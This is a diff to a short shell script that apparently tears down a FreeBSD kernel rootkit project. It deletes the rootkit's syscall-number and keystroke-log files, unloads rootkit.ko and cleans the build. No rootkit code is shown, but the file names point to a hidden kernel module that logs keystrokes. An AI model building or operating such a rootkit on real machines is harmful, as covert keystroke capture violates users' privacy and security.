@@ -1,14 +1,11 @@
 #!/bin/sh
 clear
-cd ../interact/
-cc syscall.c -o syscall
-./setflags /etc/trivial/syscall_number.txt ff
+
 rm /etc/trivial/syscall_number.txt
 rm /etc/trivial/keystrokes.txt
-sys_num=$(cat /etc/trivial/syscall_number.txt)
+
 #./syscall $sys_num 0
 
-cd ../rootkit
 
 kldunload ./rootkit.ko
 make clean
